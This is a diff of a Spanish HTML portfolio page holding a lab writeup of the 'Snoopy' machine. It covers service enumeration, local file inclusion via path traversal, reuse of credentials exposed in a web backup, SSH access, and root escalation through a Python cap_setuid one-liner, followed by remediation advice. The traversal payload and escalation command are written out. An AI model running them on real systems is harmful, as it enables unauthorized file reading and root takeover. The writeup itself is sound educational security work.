@@ -1,7 +1,225 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Snoopy: LFI, exposición de credenciales y escalada por Linux capabilities | Carlos López Jiménez</title>
+  <meta name="description" content="Writeup profesional de Snoopy: enumeración web, LFI, exposición de credenciales, acceso SSH y escalada de privilegios mediante cap_setuid en Python." />
+  <meta property="og:title" content="Snoopy: LFI, exposición de credenciales y Linux capabilities" />
+  <meta property="og:description" content="Cadena completa de explotación Linux desde reconocimiento web hasta root mediante LFI, credenciales expuestas y abuso de cap_setuid." />
+  <meta property="og:type" content="article" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <link href="../assets/writeups/writeups.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="nav">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">CL</span>
+      <span>Carlos López</span>
+    </a>
+    <div class="nav-links">
+      <a href="../index.html">Portfolio</a>
+      <a class="active" href="../writeups.html">Writeups</a>
+      <a href="../index.html#contact">Contacto</a>
+    </div>
+  </nav>
 
-<html lang="es"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1.0" name="viewport"/><title>Snoopy: LFI, credential exposure &amp; Linux capabilities privesc | Carlos LÃ³pez JimÃ©nez</title><meta content="IntrusiÃ³n Linux desde reconocimiento web hasta root mediante LFI, exposiciÃ³n de credenciales y abuso de cap_setuid en Python." name="description"/><meta content="Snoopy: LFI, credential exposure &amp; Linux capabilities privesc" property="og:title"/><meta content="IntrusiÃ³n Linux desde reconocimiento web hasta root mediante LFI, exposiciÃ³n de credenciales y abuso de cap_setuid en Python." property="og:description"/><meta content="article" property="og:type"/><link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet"/><link href="../assets/writeups/writeups.css" rel="stylesheet"/><link href="https://cdn.jsdelivr.net/npm/glightbox/dist/glightbox.min.css" rel="stylesheet"/></head><body><nav class="nav"><a class="brand" href="../index.html"><span class="brand-mark">CL</span><span>Carlos LÃ³pez</span></a><div class="nav-links"><a href="../index.html">Portfolio</a><a class="active" href="../writeups.html">Writeups</a><a href="../index.html#contact">Contact</a></div></nav><header class="detail-hero"><div class="container"><div class="breadcrumb"><a href="../writeups.html">â† Cybersecurity Writeups</a> / Web Security</div><div class="eyebrow">Web Security Â· Medium Â· 8 min</div><h1>Snoopy: LFI, credential exposure &amp; Linux capabilities privesc</h1><p class="lead">IntrusiÃ³n Linux desde reconocimiento web hasta root mediante LFI, exposiciÃ³n de credenciales y abuso de cap_setuid en Python.</p><div class="tag-strip"><span class="tag">LFI</span><span class="tag">Nmap</span><span class="tag">SSH</span><span class="tag">Linux</span><span class="tag">Capabilities</span><span class="tag">Post-exploitation</span></div><div class="hero-actions"><a class="btn btn-secondary" href="../writeups.html">Volver a la biblioteca</a></div></div></header><main class="container detail-grid"><article class="article"><div class="article-cover"><img alt="Cover del writeup Snoopy: LFI, credential exposure &amp; Linux capabilities privesc" src="../assets/writeups/img/snoopy-lfi-capabilities-cover.png" data-glightbox/></div><div class="article-content"><div class="mini-metrics"><div class="mini"><span>Target</span><strong>Ubuntu web server</strong></div><div class="mini"><span>Impact</span><strong>Full compromise</strong></div><div class="mini"><span>Core finding</span><strong>Unvalidated file inclusion</strong></div><div class="mini"><span>Privilege path</span><strong>cap_setuid</strong></div></div><div class="callout"><strong>VersiÃ³n pÃºblica profesional:</strong> flags, contraseÃ±as, tokens, cookies y valores sensibles se muestran como placeholders o estÃ¡n ocultos en las evidencias visuales.</div><h2 id="executive-summary">Executive summary</h2><p>Se documenta una cadena de compromiso completa sobre una mÃ¡quina Linux: enumeraciÃ³n de servicios, identificaciÃ³n de un parÃ¡metro vulnerable a Local File Inclusion, localizaciÃ³n de credenciales expuestas en un backup accesible por web, acceso por SSH y escalada a root mediante una capability peligrosa asignada al intÃ©rprete de Python.</p><h2 id="attack-path">Attack path</h2><p>La fase inicial descubre FTP, SSH, HTTP, MySQL y un servicio de diagnÃ³stico. El archivo robots.txt apunta a rutas de configuraciÃ³n. A partir de ahÃ­ se valida la lectura de archivos del sistema y se utiliza la exposiciÃ³n de credenciales para pivotar a acceso interactivo.</p><h2 id="recruiter-signal">Recruiter signal</h2><p>Este writeup muestra metodologÃ­a ordenada, capacidad de correlaciÃ³n entre pistas, validaciÃ³n tÃ©cnica de hallazgos y explicaciÃ³n defensiva clara, no solo ejecuciÃ³n de comandos.</p><h2 id="commands">Command notebook</h2><p>Comandos representativos del laboratorio. Los valores sensibles se han sustituido por placeholders.</p><div class="code"><pre>nmap -sC -sV -p- &lt;target&gt;
+  <header class="detail-hero">
+    <div class="container">
+      <div class="breadcrumb"><a href="../writeups.html">← Cybersecurity Writeups</a> / Web Security</div>
+      <div class="eyebrow">Web Security · Medium · 8 min</div>
+      <h1>Snoopy: LFI, exposición de credenciales y escalada por Linux capabilities</h1>
+      <p class="lead">
+        Cadena completa de explotación Linux desde enumeración web hasta acceso root mediante Local File Inclusion,
+        exposición de credenciales y abuso de <code>cap_setuid</code> en Python.
+      </p>
+      <div class="tag-strip">
+        <span class="tag">LFI</span>
+        <span class="tag">Nmap</span>
+        <span class="tag">SSH</span>
+        <span class="tag">Linux</span>
+        <span class="tag">Capabilities</span>
+        <span class="tag">Post-exploitation</span>
+      </div>
+      <div class="hero-actions">
+        <a class="btn btn-secondary" href="../writeups.html">Volver a la biblioteca</a>
+      </div>
+    </div>
+  </header>
+
+  <main class="container detail-grid">
+    <article class="article">
+      <div class="article-cover article-cover-soft">
+        <img alt="Resumen visual del writeup Snoopy" src="../assets/imgs/cover-linux.svg" />
+      </div>
+
+      <div class="article-content">
+        <div class="mini-metrics">
+          <div class="mini"><span>Target</span><strong>Ubuntu web server</strong></div>
+          <div class="mini"><span>Impacto</span><strong>Full compromise</strong></div>
+          <div class="mini"><span>Hallazgo clave</span><strong>Local File Inclusion</strong></div>
+          <div class="mini"><span>Escalada</span><strong>cap_setuid</strong></div>
+        </div>
+
+        <div class="callout">
+          <strong>Versión pública profesional:</strong> las flags, contraseñas, tokens, cookies y cualquier valor sensible se han eliminado o sustituido por placeholders.
+        </div>
+
+        <h2 id="executive-summary">Resumen ejecutivo</h2>
+        <p>
+          El laboratorio muestra una cadena de intrusión realista: primero se identifican servicios expuestos,
+          después se confirma una vulnerabilidad LFI en la aplicación web, se localiza material sensible publicado
+          indebidamente, se obtiene acceso SSH con un usuario no privilegiado y finalmente se eleva a root mediante
+          una capability peligrosa asignada al intérprete de Python.
+        </p>
+
+        <h2 id="attack-path">Ruta de ataque</h2>
+        <p>
+          La explotación no depende de un único fallo aislado, sino de la acumulación de debilidades: exposición web,
+          falta de validación de rutas, credenciales reutilizables y una configuración insegura del sistema Linux.
+        </p>
+
+        <h2 id="commands">Comandos representativos</h2>
+        <p>Los siguientes comandos resumen la metodología. Los valores sensibles están redactados.</p>
+        <div class="code"><pre>nmap -sC -sV -p- &lt;target&gt;
 curl "http://&lt;target&gt;/index.php?page=../../../../../../etc/passwd"
-ssh woodstock@&lt;target&gt;   # password redacted in public version
+curl "http://&lt;target&gt;/index.php?page=../../../../../../etc/os-release"
+ssh &lt;user&gt;@&lt;target&gt;       # password redacted
 getcap -r / 2&gt;/dev/null
-python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></div><h2 id="attack-timeline">Pasos resumidos con evidencias</h2><div class="evidence-steps"><div class="evidence-step"><div class="evidence-step-num">01</div><div class="evidence-step-body"><h3>Reconocimiento de servicios</h3><p>Escaneo completo con Nmap para identificar FTP, SSH, HTTP, MySQL y servicio de diagnÃ³stico.</p><div class="evidence-note">Evidencia: captura de Nmap y lista de puertos expuestos.</div><figure class="step-evidence"><img alt="Evidencia paso 01 - snoopy lfi capabilities" src="../assets/writeups/img/snoopy-lfi-capabilities-cover.png" data-glightbox/><figcaption>Evidencia de reconocimiento: servicios expuestos y primera superficie de ataque.</figcaption></figure></div></div><div class="evidence-step"><div class="evidence-step-num">02</div><div class="evidence-step-body"><h3>EnumeraciÃ³n web inicial</h3><p>RevisiÃ³n de la aplicaciÃ³n y del archivo robots.txt para localizar rutas de configuraciÃ³n no pensadas para exposiciÃ³n pÃºblica.</p><div class="evidence-note">Evidencia: rutas /config/ y backup referenciadas durante la navegaciÃ³n.</div><figure class="step-evidence"><img alt="Evidencia paso 02 - snoopy lfi capabilities" src="../assets/writeups/img/snoopy-lfi-capabilities-evidence1.png" data-glightbox/><figcaption>Evidencia web: validaciÃ³n de LFI y lectura controlada de ficheros del sistema.</figcaption></figure></div></div><div class="evidence-step"><div class="evidence-step-num">03</div><div class="evidence-step-body"><h3>ValidaciÃ³n de LFI</h3><p>Prueba del parÃ¡metro page con rutas locales controladas para confirmar lectura arbitraria de ficheros.</p><div class="evidence-note">Evidencia: respuesta web mostrando /etc/passwd y /etc/os-release, sin incluir datos sensibles.</div><figure class="step-evidence"><img alt="Evidencia paso 03 - snoopy lfi capabilities" src="../assets/writeups/img/snoopy-lfi-capabilities-evidence2.png" data-glightbox/><figcaption>Evidencia de post-explotaciÃ³n: capabilities peligrosas detectadas y saneadas.</figcaption></figure></div></div><div class="evidence-step"><div class="evidence-step-num">04</div><div class="evidence-step-body"><h3>CorrelaciÃ³n de informaciÃ³n</h3><p>Uso de la LFI y de las rutas descubiertas para entender usuarios del sistema y superficie disponible.</p><div class="evidence-note">Evidencia: usuarios del sistema identificados en la salida del fichero de sistema.</div><figure class="step-evidence"><img alt="Evidencia paso 04 - snoopy lfi capabilities" src="../assets/writeups/img/snoopy-lfi-capabilities-cover.png" data-glightbox/><figcaption>Evidencia de reconocimiento: servicios expuestos y primera superficie de ataque.</figcaption></figure></div></div><div class="evidence-step"><div class="evidence-step-num">05</div><div class="evidence-step-body"><h3>Acceso inicial</h3><p>Credenciales expuestas en un backup permitieron acceso SSH a un usuario no privilegiado.</p><div class="evidence-note">Evidencia: sesiÃ³n SSH validada; contraseÃ±a redactada en la versiÃ³n pÃºblica.</div><figure class="step-evidence"><img alt="Evidencia paso 05 - snoopy lfi capabilities" src="../assets/writeups/img/snoopy-lfi-capabilities-evidence1.png" data-glightbox/><figcaption>Evidencia web: validaciÃ³n de LFI y lectura controlada de ficheros del sistema.</figcaption></figure></div></div><div class="evidence-step"><div class="evidence-step-num">06</div><div class="evidence-step-body"><h3>EnumeraciÃ³n post-explotaciÃ³n</h3><p>BÃºsqueda de vectores locales revisando SUID, sudo y capabilities.</p><div class="evidence-note">Evidencia: salida de getcap con capability peligrosa sobre el intÃ©rprete.</div><figure class="step-evidence"><img alt="Evidencia paso 06 - snoopy lfi capabilities" src="../assets/writeups/img/snoopy-lfi-capabilities-evidence2.png" data-glightbox/><figcaption>Evidencia de post-explotaciÃ³n: capabilities peligrosas detectadas y saneadas.</figcaption></figure></div></div><div class="evidence-step"><div class="evidence-step-num">07</div><div class="evidence-step-body"><h3>Escalada y remediaciÃ³n</h3><p>Abuso de cap_setuid para elevar privilegios y propuesta de hardening.</p><div class="evidence-note">Evidencia: verificaciÃ³n de privilegios con valores de flag ocultos.</div><figure class="step-evidence"><img alt="Evidencia paso 07 - snoopy lfi capabilities" src="../assets/writeups/img/snoopy-lfi-capabilities-cover.png" data-glightbox/><figcaption>Evidencia de reconocimiento: servicios expuestos y primera superficie de ataque.</figcaption></figure></div></div></div><h2 id="findings">Key findings</h2><div class="accordion"><details open=""><summary>The page parameter accepts arbitrary filesystem paths.</summary><p>Impacto tÃ©cnico identificado y validado durante el laboratorio. En una evaluaciÃ³n real se priorizarÃ­a por criticidad, explotabilidad y alcance.</p></details><details open=""><summary>Backup/configuration material was exposed from a web-accessible directory.</summary><p>Impacto tÃ©cnico identificado y validado durante el laboratorio. En una evaluaciÃ³n real se priorizarÃ­a por criticidad, explotabilidad y alcance.</p></details><details open=""><summary>A Python binary with cap_setuid allows UID manipulation and root escalation.</summary><p>Impacto tÃ©cnico identificado y validado durante el laboratorio. En una evaluaciÃ³n real se priorizarÃ­a por criticidad, explotabilidad y alcance.</p></details></div><h2 id="evidence">Visual evidence</h2><div class="evidence-grid"><figure class="evidence"><img alt="Evidencia del laboratorio Snoopy: LFI, credential exposure &amp; Linux capabilities privesc" src="../assets/writeups/img/snoopy-lfi-capabilities-evidence1.png" data-glightbox/><figcaption>Evidencia visual del laboratorio, saneada para publicaciÃ³n.</figcaption></figure><figure class="evidence"><img alt="Evidencia del laboratorio Snoopy: LFI, credential exposure &amp; Linux capabilities privesc" src="../assets/writeups/img/snoopy-lfi-capabilities-evidence2.png" data-glightbox/><figcaption>Evidencia visual del laboratorio, saneada para publicaciÃ³n.</figcaption></figure></div><h2 id="mitigation">Remediation notes</h2><ul><li>Whitelist valid page templates instead of concatenating user-controlled paths.</li><li>Block web access to configuration directories and backup extensions.</li><li>Audit Linux capabilities periodically and remove cap_setuid from interpreters.</li></ul></div></article><aside class="toc"><h3>On this writeup</h3><a href="#executive-summary">Executive summary</a><a href="#attack-path">Attack path</a><a href="#recruiter-signal">Recruiter signal</a><a href="#commands">Command notebook</a><a href="#attack-timeline">Pasos + evidencias</a><a href="#findings">Key findings</a><a href="#mitigation">Remediation</a><a href="#evidence">Evidence</a></aside></main><footer class="page-footer">Â© 2026 Carlos LÃ³pez JimÃ©nez Â· Cybersecurity Writeups</footer><script src="../assets/writeups/writeup-evidence-data.js"></script><script src="../assets/writeups/writeup-evidence.js"></script><script src="https://cdn.jsdelivr.net/npm/glightbox/dist/glightbox.min.js"></script><script>const lightbox = GLightbox({});</script></body></html>
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></div>
+
+        <h2 id="attack-timeline">Pasos resumidos con evidencias</h2>
+        <div class="evidence-steps">
+          <section class="evidence-step">
+            <div class="evidence-step-num">01</div>
+            <div class="evidence-step-body">
+              <div class="evidence-step-top"><span class="phase-badge">Reconocimiento</span><span class="redacted-badge">Sin flags</span></div>
+              <h3>Enumeración de servicios</h3>
+              <p>Se realiza un escaneo completo para detectar puertos abiertos y tecnologías principales.</p>
+              <div class="code compact"><pre>nmap -sC -sV -p- &lt;target&gt;</pre></div>
+              <div class="evidence-note">Evidencia esperada: FTP, SSH, HTTP, MySQL y servicio adicional de diagnóstico expuestos.</div>
+            </div>
+          </section>
+
+          <section class="evidence-step">
+            <div class="evidence-step-num">02</div>
+            <div class="evidence-step-body">
+              <div class="evidence-step-top"><span class="phase-badge">Web enumeration</span></div>
+              <h3>Revisión de rutas web</h3>
+              <p>La aplicación y sus rutas públicas permiten descubrir referencias útiles como archivos de configuración o backups.</p>
+              <div class="code compact"><pre>curl http://&lt;target&gt;/robots.txt
+gobuster dir -u http://&lt;target&gt;/ -w &lt;wordlist&gt;</pre></div>
+              <div class="evidence-note">Evidencia esperada: rutas internas o ficheros auxiliares publicados por error.</div>
+            </div>
+          </section>
+
+          <section class="evidence-step">
+            <div class="evidence-step-num">03</div>
+            <div class="evidence-step-body">
+              <div class="evidence-step-top"><span class="phase-badge">Explotación web</span></div>
+              <h3>Validación de Local File Inclusion</h3>
+              <p>El parámetro vulnerable acepta rutas arbitrarias y permite leer ficheros locales del servidor.</p>
+              <div class="code compact"><pre>curl "http://&lt;target&gt;/index.php?page=../../../../../../etc/passwd"</pre></div>
+              <div class="evidence-note">Evidencia esperada: lectura controlada de <code>/etc/passwd</code> y confirmación del sistema objetivo.</div>
+            </div>
+          </section>
+
+          <section class="evidence-step">
+            <div class="evidence-step-num">04</div>
+            <div class="evidence-step-body">
+              <div class="evidence-step-top"><span class="phase-badge">Credential exposure</span><span class="redacted-badge">Credenciales ocultas</span></div>
+              <h3>Exposición de credenciales</h3>
+              <p>La información publicada permite obtener credenciales o material reutilizable para acceso interactivo.</p>
+              <div class="code compact"><pre>curl "http://&lt;target&gt;/&lt;backup-or-config-path&gt;"</pre></div>
+              <div class="evidence-note">Evidencia esperada: usuario válido y contraseña sustituida por <code>[REDACTED]</code>.</div>
+            </div>
+          </section>
+
+          <section class="evidence-step">
+            <div class="evidence-step-num">05</div>
+            <div class="evidence-step-body">
+              <div class="evidence-step-top"><span class="phase-badge">Initial access</span></div>
+              <h3>Acceso SSH</h3>
+              <p>Con las credenciales expuestas se obtiene una shell como usuario no privilegiado.</p>
+              <div class="code compact"><pre>ssh &lt;user&gt;@&lt;target&gt;
+id
+hostname</pre></div>
+              <div class="evidence-note">Evidencia esperada: sesión interactiva válida sin mostrar contraseña ni flags.</div>
+            </div>
+          </section>
+
+          <section class="evidence-step">
+            <div class="evidence-step-num">06</div>
+            <div class="evidence-step-body">
+              <div class="evidence-step-top"><span class="phase-badge">Post-exploitation</span></div>
+              <h3>Enumeración local</h3>
+              <p>Se revisan vectores habituales de escalada: permisos sudo, binarios SUID y Linux capabilities.</p>
+              <div class="code compact"><pre>sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null</pre></div>
+              <div class="evidence-note">Evidencia esperada: Python con <code>cap_setuid</code>, una configuración crítica si no está justificada.</div>
+            </div>
+          </section>
+
+          <section class="evidence-step">
+            <div class="evidence-step-num">07</div>
+            <div class="evidence-step-body">
+              <div class="evidence-step-top"><span class="phase-badge">Privilege escalation</span><span class="redacted-badge">Root flag oculta</span></div>
+              <h3>Escalada a root</h3>
+              <p>La capability permite manipular el UID efectivo y abrir una shell privilegiada.</p>
+              <div class="code compact"><pre>python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id</pre></div>
+              <div class="evidence-note">Evidencia esperada: UID 0/root verificado. La flag no se publica.</div>
+            </div>
+          </section>
+        </div>
+
+        <h2 id="findings">Hallazgos principales</h2>
+        <div class="accordion">
+          <details open>
+            <summary>El parámetro de página permite inclusión de ficheros locales.</summary>
+            <p>Impacto: lectura de archivos del sistema, apoyo a enumeración interna y posible extracción de secretos.</p>
+          </details>
+          <details open>
+            <summary>Material de configuración o backup expuesto desde el servidor web.</summary>
+            <p>Impacto: exposición de credenciales y salto desde vulnerabilidad web a acceso interactivo.</p>
+          </details>
+          <details open>
+            <summary>Python dispone de <code>cap_setuid</code>.</summary>
+            <p>Impacto: elevación directa a root si un usuario local puede ejecutar el intérprete afectado.</p>
+          </details>
+        </div>
+
+        <h2 id="mitigation">Remediación</h2>
+        <ul>
+          <li>Usar una whitelist estricta de plantillas válidas en lugar de concatenar rutas controladas por el usuario.</li>
+          <li>Bloquear el acceso web a directorios de configuración, backups y extensiones sensibles.</li>
+          <li>Rotar las credenciales expuestas y evitar su reutilización en servicios interactivos como SSH.</li>
+          <li>Auditar capabilities con regularidad y eliminar <code>cap_setuid</code> de intérpretes como Python, Perl o Ruby.</li>
+          <li>Monitorizar accesos anómalos a ficheros del sistema y rutas internas desde la aplicación web.</li>
+        </ul>
+
+        <h2 id="recruiter-signal">Qué demuestra este writeup</h2>
+        <p>
+          Metodología ordenada, capacidad de correlacionar pistas, criterio para no publicar secretos y comprensión tanto ofensiva como defensiva del fallo.
+        </p>
+      </div>
+    </article>
+
+    <aside class="toc">
+      <h3>On this writeup</h3>
+      <a href="#executive-summary">Resumen ejecutivo</a>
+      <a href="#attack-path">Ruta de ataque</a>
+      <a href="#commands">Comandos</a>
+      <a href="#attack-timeline">Pasos + evidencias</a>
+      <a href="#findings">Hallazgos</a>
+      <a href="#mitigation">Remediación</a>
+      <a href="#recruiter-signal">Recruiter signal</a>
+    </aside>
+  </main>
+
+  <footer class="page-footer">© 2026 Carlos López Jiménez · Cybersecurity Writeups</footer>
+</body>
+</html>
